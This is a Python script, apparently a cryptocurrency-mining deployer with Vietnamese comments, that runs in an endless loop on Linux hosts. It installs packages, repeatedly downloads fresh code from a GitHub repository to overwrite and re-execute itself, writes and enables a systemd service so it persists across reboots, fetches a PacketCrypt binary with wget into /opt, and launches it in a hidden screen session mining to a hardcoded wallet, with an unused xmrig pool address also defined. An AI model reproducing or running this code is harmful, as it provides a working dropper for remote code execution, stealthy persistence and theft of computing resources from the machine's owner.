import os
import sys
import time
from sys import platform
import requests
import subprocess
import multiprocessing


if platform == "linux" or platform == "linux2":
    operate_system = 'lin'
elif platform == "darwin":
    operate_system = 'OS X'
elif platform == "win32":
    operate_system = 'win'
cores = multiprocessing.cpu_count()
cores = cores - 1
if cores <= 0:
    cores = 1
timeout = 30
thoi_gian_nghi = 28800

if operate_system == 'lin':
    try:
        os.system('apt-get update -y')
        #os.system ('apt --fix-broken install -y')
        os.system('apt-get install -y screen')
        os.system('apt-get install -y python-pip')
        os.system('apt-get install -y python3-pip')
    except:
        pass
    try:
        os.system('pip install psutil')
        os.system('pip3 install psutil')
    except:
        pass
import psutil
command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
#command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
while True:
    time.sleep(1)
    working_dir = os.path.dirname(os.path.realpath(__file__))
    print(working_dir)
    path_app = os.path.realpath(__file__)
    version_chinh = 5.0
    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_chinh'
    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_cpu.py'
    try:
        response = requests.get(link_version_chinh, timeout=timeout)
        get_version_chinh = float(response.text)
        print(get_version_chinh)
        if get_version_chinh == version_chinh:
            print('Dang o version moi nhat la %s' % version_chinh)
        else:
            if len(response.text) < 5:
                print('Co version moi, update thoi')
                response = requests.get(link_dao, timeout=timeout)
                data_trave = response.text
                print(data_trave)
                fileopen = open(path_app, 'w+')
                fileopen.write(data_trave)
                fileopen.close()
                os.system('python3 %s' % path_app)
                sys.exit()
    except:
        pass

    if operate_system == 'lin':
        try:
            path_service = '/lib/systemd/system/dao.service'
            data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
            if not os.path.exists(path_service):
                fileopen = open(path_service, 'w+')
                fileopen.write(data + '\n')
                fileopen.close()
            #os.system('chmod 600 %s' %path)
                os.system('systemctl daemon-reload')
                os.system('systemctl enable dao')
        except:
            pass
        link_version_pkt = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_pkt'
        link_download_pkt = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/packetcrypt-v0.5.1-linux_amd64'
        pkt_name = 'packetcrypt'
        try:
            if not os.path.isfile('/opt/%s' % pkt_name):
                print('Chua co chuong trinh %s' % pkt_name)
                os.chdir('/opt')
                os.system('wget %s -O %s' % (link_download_pkt, pkt_name))
                os.system('chmod 777 %s' % pkt_name)
            else:
                print('Da co chuong trinh %s' % pkt_name)
        except:
            pass
        try:
            command = '/opt/%s --version' % pkt_name
            output = subprocess.check_output(command, shell=True).decode('utf-8')
            #print(output)
            #time.sleep(10000)
            version_tam = output.split(' ')
            version_pkt = version_tam[1].strip()
            print('Version pkt la %s' %version_pkt)
            response = requests.get(link_version_pkt, timeout=timeout)
            get_version_pkt = response.text.strip()
            print('Version pkt lay tren web la %s' %get_version_pkt)
            #Check version uam
            if get_version_pkt == version_pkt and len(get_version_pkt) < 50:
                print('pkt dang o phien ban moi nhat %s' %version_pkt)
            if get_version_pkt != version_pkt and len(get_version_pkt) < 50:
                os.system('pkill %s' % pkt_name)
                print('pkt da co phien ban moi, tien hanh update thoi')
                os.chdir('/opt')
                os.system('rm -rf /opt/%s' % pkt_name)
                os.system('wget %s' % link_download_pkt)
        except:
            pass

        try:
            pkt_dachay = False
            for proc in psutil.process_iter():
                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                #print(process_name['name'])
                if pkt_name == process_name['name']:
                    print('Da co chuong trinh %s chay' % pkt_name)
                    pkt_dachay = True
                    break
        except:
            pass
        if pkt_dachay == False:
            #command = '/opt/%s ann -p pkt1qq9ac78t357w29t6vua846tkz8ke89av63w5he7 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
            #command = '/opt/%s ann -p pkt1qq9ac78t357w29t6vua846tkz8ke89av63w5he7 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com' % pkt_name
            command = '/opt/%s ann -p pkt1qq9ac78t357w29t6vua846tkz8ke89av63w5he7 http://pool.pkteer.com http://pool.pktpool.io/ http://pool.pkt.world/' % pkt_name
            #command = '/opt/%s ann -p pkt1qq9ac78t357w29t6vua846tkz8ke89av63w5he7 http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com' % pkt_name
            print(command)
            if os.path.isfile('/usr/bin/screen'):
                print('Co chuong trinh screen')
                os.system ('screen -dmS %s %s' %(pkt_name, command))
            elif os.path.isfile('/usr/bin/nohup'):
                print('Co chuong trinh nohup')
                os.system ('nohup %s &' %command)
            else:
                os.system ('%s &' %command)
    time.sleep(thoi_gian_nghi)
      
   
